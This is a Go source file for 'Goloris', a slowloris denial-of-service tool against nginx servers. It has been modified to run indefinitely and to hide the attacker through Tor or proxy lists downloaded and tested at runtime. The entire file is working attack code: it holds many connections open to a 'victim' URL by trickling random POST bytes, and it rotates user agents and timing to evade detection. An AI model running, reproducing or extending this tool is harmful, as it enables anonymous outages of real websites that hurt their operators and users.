// Goloris - slowloris[1] for nginx.
//
// The original source code is available at http://github.com/valyala/goloris.
// This version has been modified to support TOR proxy and indefinite attacking
//
package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"golang.org/x/net/proxy"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	CRLF         = "\r\n"
	proxyTestUrl = "http://ipinfo.io/ip"
	charset      = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567891234567890"
)

type proxyDef struct {
	kind  string
	proto string
	loc   string
}

type proxyFiles struct {
	defs []*proxyDef
	str  string
}

func (i *proxyFiles) String() string {
	return i.str
}

func (i *proxyFiles) Set(value string) error {
	i.str = value
	defStrings := strings.Split(value, ",")

	i.defs = []*proxyDef{}

	for _, defString := range defStrings {
		def := &proxyDef{}
		parts := strings.Split(strings.TrimSpace(defString), " ")
		if len(parts) > 1 {
			def.proto = strings.ToLower(parts[0])
			def.loc = parts[1]
		} else {
			def.loc = parts[0]
		}
		if strings.HasPrefix(strings.ToLower(def.loc), "http") {
			def.kind = "r"
		} else {
			def.kind = "f"
		}
		i.defs = append(i.defs, def)
	}
	return nil
}

var (
	headersUseragents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
	}
)

var (
	contentLength    = flag.Int("contentLength", 1e6, "The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size")
	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
	rampUpInterval   = flag.Duration("rampUpInterval", 0, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
	testDuration     = flag.Duration("testDuration", 0, "Test duration")
	tor              = flag.Bool("tor", false, "Use Tor proxy")
	torPort          = flag.Int("torPort", 9050, "Port used for Tor proxy")
	torHost          = flag.String("torHost", "127.0.0.1", "Host used for Tor proxy")
	keepAlive        = flag.Bool("keepAlive", false, "use KeepAlive with TCP connection")
	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
	maxConnections   = flag.Int("maxConnections", 1024, "The maximum number of connections to keep open at any one time")
	testProxies      = flag.Bool("testProxies", false, "Test ALL proxies before running to only use good proxies while running")
	refreshProxies   = flag.Duration("refreshProxies", 0, "refresh proxies from all sources every X duration. 0 = Disable refresh")
	proxyTimeout     = flag.Duration("proxyTimeout", 10*time.Second, "timeout for proxy before proxy is removed from proxy list")
	userAgents       = flag.String("userAgents", "", "file of user-agent strings to use")
)

var (
	charsetLen    = len(charset)
	sharedReadBuf = make([]byte, 4096)
	proxySources  = &proxyFiles{
		defs: []*proxyDef{},
	}
	proxyPool = map[string]*url.URL{}
	proxyMu   = sync.Mutex{}
)

func main() {
	flag.Var(proxySources, "proxy", "space delimited list of proxy sources. "+
		"Sources can be remote (e.g.: http://example.com/proxy.txt) or local (e.g. ./proxies.txt). "+
		"Optionally add the protocol to the proxy file by adding the proto before the proxy source: "+
		"<proto1> <source1>, <proto2> <source2>")
	flag.Parse()
	flag.VisitAll(func(f *flag.Flag) {
		fmt.Printf("%s=%v\n", f.Name, f.Value)
	})

	if len(*userAgents) > 0 {
		// attempt to load user agent strings
		if err := addUserAgentsFromFile(*userAgents); err != nil {
			log.Fatalf("error loading user agents from file: %s: %s\n", *userAgents, err)
		}
	}

	if len(proxySources.defs) > 0 {
		// load the proxies unless tor was activated
		if *tor {
			log.Printf("WARNING: proxies were set but Tor is in use. proxies will be ignored!\n")
		} else {
			loadProxies()
			if *refreshProxies > 0 {
				if *testProxies {
					// test proxies if flag was set
					testAllProxies()
				}
				go func() {
					// the go routine that will load proxies every N interval
					c := make(chan os.Signal)
					signal.Notify(c, os.Interrupt, syscall.SIGTERM)
					interval := time.NewTicker(*refreshProxies)
					for {
						select {
						case <-interval.C:
							loadProxies()
						case <-c:
							return
						}
					}
				}()
			}
		}
	}

	runtime.GOMAXPROCS(*goMaxProcs)

	victimUri, err := url.Parse(*victimUrl)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%s]: %s\n", *victimUrl, err)
	}
	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		port := "80"
		if victimUri.Scheme == "https" {
			port = "443"
		}
		victimHostPort = net.JoinHostPort(victimHostPort, port)
	}
	host := victimUri.Host
	if len(*hostHeader) > 0 {
		host = *hostHeader
	}

	requestHeaders := []string{
		fmt.Sprintf("POST %s HTTP/1.1", victimUri.RequestURI()),
		fmt.Sprintf("Host: %s", host),
		"Content-Type: application/x-www-form-urlencoded",
		fmt.Sprintf("Content-Length: %d", *contentLength),
	}

	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
	activeConnectionsCh := make(chan int, *dialWorkersCount)
	maxConnectionsCh := make(chan struct{}, *maxConnections)
	go activeConnectionsCounter(activeConnectionsCh)
	for i := 0; i < *dialWorkersCount; i++ {
		go dialWorker(activeConnectionsCh, maxConnectionsCh, victimHostPort, victimUri, requestHeaders)
		time.Sleep(dialWorkersLaunchInterval)
	}

	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		// cleanup and exit
		log.Printf("stopping attack due to SIGTERM\n")
		close(activeConnectionsCh)
		os.Exit(1)
	}()

	if *testDuration == 0 {
		// indefinite test
		for {
			time.Sleep(time.Millisecond)
		}
	}
	time.Sleep(*testDuration)
}

func dialWorker(activeConnectionsCh chan<- int, sem chan struct{}, victimHostPort string, victimUri *url.URL, requestHeaders []string) {
	isTls := victimUri.Scheme == "https"
	for {
		time.Sleep(*rampUpInterval)
		conn := dialVictim(victimHostPort, isTls)
		if conn != nil {
			sem <- struct{}{}
			go doLoris(conn, activeConnectionsCh, sem, requestHeaders)
		}
	}
}

func activeConnectionsCounter(ch <-chan int) {
	var activeConnections int
	for n := range ch {
		activeConnections += n
		log.Printf("Holding %d connections [%d]\n", activeConnections, n)
	}
}

func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
	var (
		conn net.Conn
		err  error
	)

	if *tor {
		// if using TOR then use a proxy dialer with local tor proxy
		dialer, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", *torHost, *torPort), nil, nil)
		if err != nil {
			log.Printf("Error creating TOR proxy: %s\n", err)
			return nil
		}
		conn, err = dialer.Dial("tcp", hostPort)
		if err != nil {
			log.Printf("Couldn't esablish connection to [%s] via TOR. Error: %s\n", hostPort, err)
			return nil
		}
	} else if len(proxyPool) > 0 {
		// always turn off tls when using proxy as proxy will handle tls on proxy side
		isTls = false
		// grab a random proxy connection from the proxy pool
		conn, err = randomProxyConnection(hostPort, 10, 0)
		if err != nil {
			log.Printf("Couldn't esablish connection to [%s] via proxy. Error: %s\n", hostPort, err)
			return nil
		}
	} else {
		conn, err = net.Dial("tcp", hostPort)
		if err != nil {
			log.Printf("Couldn't esablish connection to [%s] Error: %s\n", hostPort, err)
			return nil
		}
	}

	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
	}
	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}
	if *keepAlive {
		if err = tcpConn.SetKeepAlive(true); err != nil {
			log.Fatalf("Cannot set keep alive write buffer: [%s]\n", err)
		}
		if err = tcpConn.SetKeepAlivePeriod(time.Second * 10); err != nil {
			log.Fatalf("Cannot set keep alive period on write buffer: [%s]\n", err)
		}
	}
	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}
	if !isTls {
		return tcpConn
	}

	tlsConn := tls.Client(conn, TlsConfig)
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		log.Printf("Couldn't establish tls connection to [%s]: %s\n", hostPort, err)
		return nil
	}
	return tlsConn
}

func doLoris(conn io.ReadWriteCloser, activeConnectionsCh chan<- int, sem <-chan struct{}, requestHeaders []string) {
	defer conn.Close()

	requestHeaders = append(requestHeaders,
		fmt.Sprintf("User-Agent: %s", headersUseragents[rand.Intn(len(headersUseragents))]))

	requestHeader := []byte(strings.Join(requestHeaders, CRLF) + CRLF)

	if _, err := conn.Write(requestHeader); err != nil {
		log.Printf("Cannot write requestHeader=[%v]: %s\n", requestHeader, err)
		return
	}
	activeConnectionsCh <- 1
	defer func() {
		activeConnectionsCh <- -1
		<-sem
	}()

	readerStopCh := make(chan int, 1)
	go nullReader(conn, readerStopCh)

	for i := 0; i < *contentLength; i++ {
		select {
		case <-readerStopCh:
			return
		case <-time.After(randomInterval(*sleepInterval, time.Second)): // add random time to replicate actual bad conn
		}
		if _, err := conn.Write(randomByte()); err != nil {
			log.Printf("Error when writing %d byte out of %d bytes: %s\n", i, *contentLength, err)
			return
		}
	}
}

func randomInterval(target time.Duration, plusMinus time.Duration) time.Duration {
	ns := int(plusMinus.Nanoseconds())
	dur := target + time.Duration((rand.Intn(ns)*2)-ns)
	if dur < 0 {
		return 0
	}
	return dur
}

func nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading server response: %s\n", err)
	} else {
		log.Printf("Unexpected response read from server: %s\n", sharedReadBuf[:n])
	}
}

func randomByte() []byte {
	char := make([]byte, 1)
	char[0] = charset[rand.Intn(charsetLen)]
	return char
}

func loadProxies() {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	var err error
	if len(proxySources.defs) > 0 {
		proxyPool = map[string]*url.URL{}
		for _, def := range proxySources.defs {
			if def.kind == "f" {
				err = addProxiesFromFile(def.loc, def.proto)
			} else {
				err = addProxiesFromUrl(def.loc, def.proto)
			}
			if err != nil {
				log.Fatalf("error loading proxy from %s: %s", def.loc, err)
			}
		}
	}
}

func testAllProxies() {
	workers := *maxConnections
	respCh := make(chan error)
	queue := make(chan *url.URL, 1)
	ctx, cancel := context.WithCancel(context.Background())
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	for i := 0; i < workers; i++ {
		go func() {
			for {
				select {
				case p := <-queue:
					respCh <- testProxy(p, *proxyTimeout)
				case <-ctx.Done():
					return
				case <-c:
					os.Exit(1)
				}
			}
		}()
	}

	var pl = map[string]*url.URL{}
	for k, v := range proxyPool {
		pl[k] = v
	}

	go func() {
		for _, p := range pl {
			queue <- p
		}
		cancel()
	}()

	errCnt := 0
	okCnt := 0
	for range pl {
		err := <-respCh
		if err != nil {
			errCnt++
		} else {
			okCnt++
		}
	}
	log.Printf("proxy test summary ---- \n ok: %d, err: %d\n", okCnt, errCnt)
}

type fateProxyFormat struct {
	T string `json:"type"`
	H string `json:"host"`
	P int    `json:"port"`
}

func addProxiesFromString(str string, proto string) error {
	scanner := bufio.NewScanner(strings.NewReader(str))
	cnt := 0
	for scanner.Scan() {
		txt := strings.TrimSpace(scanner.Text())
		if len(txt) < 1 {
			continue
		}
		proxyHost := txt
		if string(txt[0]) == "{" {
			// if strings starts with "{" then let's attempt to parse it with json
			ft := &fateProxyFormat{}
			if err := json.Unmarshal([]byte(txt), ft); err != nil {
				//log.Printf("failed to parse %s as url\n", proxyUrl)
				continue
			}
			proxyHost = fmt.Sprintf("%s:%d", ft.H, ft.P)
			proto = ft.T
		}
		if strings.Contains(txt, "://") {
			parts := strings.Split(txt, "://")
			proto = parts[0]
			proxyHost = parts[1]
			hostParts := strings.Split(proxyHost, " ")
			if len(hostParts) > 0 {
				// in case of proxy txt files that contain additional information
				// such as ``92.51.40.1:8080 RU-N! -`` from https://spys.me/proxy.txt
				proxyHost = hostParts[0]
			}
		}
		proxyUrl := fmt.Sprintf("%s://%s", proto, proxyHost)
		parsedUrl, err := url.Parse(proxyUrl)
		if err != nil {
			//log.Printf("failed to parse %s as url\n", proxyUrl)
			continue
		}
		proxyPool[parsedUrl.String()] = parsedUrl
		cnt += 1
		//log.Printf("added proxy url: %s\n", parsedUrl)
	}
	log.Printf("loaded %d proxies. total: %d", cnt, len(proxyPool))
	return nil
}

func addProxiesFromUrl(downloadUrl, proto string) error {
	resp, err := http.Get(downloadUrl)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	bodyString := string(body)
	return addProxiesFromString(bodyString, proto)
}

func addUserAgentsFromFile(path string) error {
	fp, err := os.Open(path)
	if err != nil {
		return err
	}
	scanner := bufio.NewScanner(fp)
	uaSlice := make([]string, 0)

	for scanner.Scan() {
		txt := strings.TrimSpace(scanner.Text())
		if len(txt) < 1 {
			continue
		}
		uaSlice = append(uaSlice, txt)
	}
	if len(uaSlice) > 1 {
		headersUseragents = uaSlice
	}
	log.Printf("loaded %d user-agents strings", len(headersUseragents))
	return nil
}

func addProxiesFromFile(path, proto string) error {
	fp, err := os.Open(path)
	if err != nil {
		return err
	}
	content, err := ioutil.ReadAll(fp)
	if err != nil {
		return err
	}
	return addProxiesFromString(string(content), proto)
}

func randomProxy() *url.URL {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	choice := rand.Intn(len(proxyPool))
	i := 0
	for _, u := range proxyPool {
		if i == choice {
			return u
		}
		i++
	}
	return nil
}

func randomProxyConnection(hostPort string, maxattempts, attempts int) (net.Conn, error) {
	// connect to a proxy
	p := randomProxy()

	var (
		dialer proxy.Dialer
		err    error
	)
	if p.Scheme == "socks5" {
		dialer, err = proxy.SOCKS5("tcp", p.Host, nil, nil)
	} else {
		dialer, err = proxy.FromURL(p, nil)
	}
	if err != nil {
		log.Printf("Error creating proxy to %s: %s\n", p, err)
		deleteProxy(p.String())
		if attempts > maxattempts {
			return nil, err
		} else {
			attempts += 1
			return randomProxyConnection(hostPort, maxattempts, attempts)
		}
	}

	c, err := dialer.Dial("tcp", hostPort)
	if err != nil {
		log.Printf("Couldn't esablish connection to [%s] via proxy %s. Error: %s\n", hostPort, p, err)
		deleteProxy(p.String())
		if attempts > maxattempts {
			return nil, err
		} else {
			attempts += 1
			return randomProxyConnection(hostPort, maxattempts, attempts)
		}
	}
	if err := testProxy(p, *proxyTimeout); err != nil {
		if attempts > maxattempts {
			return nil, err
		} else {
			attempts += 1
			return randomProxyConnection(hostPort, maxattempts, attempts)
		}
	}
	return c, err
}

func deleteProxy(key string) {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	delete(proxyPool, key)
	log.Printf("deleted proxy %s from proxy list. proxy count now = %d\n", key, len(proxyPool))
}

func testProxy(proxyUrl *url.URL, timeout time.Duration) (err error) {

	defer func() {
		if err != nil {
			deleteProxy(proxyUrl.String())
		}
	}()

	var dialer proxy.Dialer
	//log.Printf("Testing proxy: %s", proxyUrl)
	testUrl, _ := url.Parse(proxyTestUrl)

	dialer, err = proxy.FromURL(proxyUrl, nil)
	if err != nil {
		log.Printf("error creating proxy to %s: %s\n", proxyUrl, err)
		return err
	}

	conn, err := dialer.Dial("tcp", testUrl.Host+":80"+testUrl.RequestURI())
	if err != nil {
		log.Printf("proxy %s failed. Removing from list: %s", proxyUrl, err)
		return err
	}
	conn.SetDeadline(time.Now().Add(timeout))
	defer conn.Close()

	req, err := http.NewRequest("GET", testUrl.String(), nil)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Accept", "*/*")

	if proxyUrl.Scheme == "http" || proxyUrl.Scheme == "https" {
		err = req.WriteProxy(conn)
	} else {
		err = req.Write(conn)
	}

	if err != nil {
		log.Printf("Proxy %s failed while writing output: %s", err)
		return
	}

	res, err := http.ReadResponse(bufio.NewReader(conn), req)
	if err != nil {
		log.Printf("Proxy %s failed while reading output buffer: %s", proxyUrl, err)
		return
	}
	if res.StatusCode/100 != 2 {
		log.Printf("Proxy got bad status code %d", res.StatusCode)
		return
	}
	//log.Printf("Proxy %s is up!", proxyUrl)
	return
}
